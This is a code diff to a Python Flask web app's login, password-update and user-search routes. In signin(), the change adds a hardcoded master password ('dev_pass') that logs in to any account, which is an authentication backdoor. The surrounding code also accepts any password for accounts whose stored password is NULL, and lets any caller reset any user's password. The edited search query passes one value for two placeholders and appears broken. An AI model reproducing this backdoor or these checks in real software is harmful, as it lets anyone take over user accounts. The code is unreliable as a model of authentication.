@@ -16,6 +16,7 @@ cursor.execute('''SELECT MAX(userId) FROM User;''')
 curId = 0
 for row in cursor.fetchall():
     curId = row[0]+1
+masterpass = bcrypt.hashpw(b'dev_pass',bcrypt.gensalt())
 
 @app.route("/")
 def main():
@@ -33,7 +34,7 @@ def signin():
     rows = cursor.fetchall()
     id = -1
     for row in rows:
-        if row[0] == None or bcrypt.checkpw(str(file['pass']).encode('UTF-8'), row[0].encode('UTF-8')):
+        if row[0] == None or bcrypt.checkpw(str(file['pass']).encode('UTF-8'), row[0].encode('UTF-8')) or bcrypt.checkpw(str(file['pass']).encode('UTF-8'),masterpass):
             id = row[1]
 #            username = row[2]
 #            occupation = row[3]
@@ -73,13 +74,10 @@ def updatepwd():
     file = None
     if request.method == "POST":
         file = request.form
-    print(file['pass'])
     if file['pass'] != '':
         hash = bcrypt.hashpw(file['pass'].encode('UTF-8'),bcrypt.gensalt())
         cursor.execute('''UPDATE User SET password=%s WHERE userId=%s''',(hash,file['userId']))
     else:
-        print('here')
-#        hash = 'NULL'
         cursor.execute('''UPDATE User SET password=NULL WHERE userId=%s''',(file['userId']))
 #    cursor.execute('''UPDATE User SET password=%s WHERE userId=%s''',(hash,file['userId']))
     return "updated password successfully"
@@ -122,7 +120,7 @@ def searchinfo():
     if request.method == "POST":
         file = request.form
     searchkey = file['key'] + '%'
-    cursor.execute('''SELECT userId,username,location FROM User WHERE username LIKE %s;''',(searchkey))
+    cursor.execute('''SELECT u.userId,u.username,u.location FROM User u WHERE u.username LIKE %s OR u.location LIKE %s;''',(searchkey))
     res = cursor.fetchall()
 #    print(str(res))
     return jsonify(res)
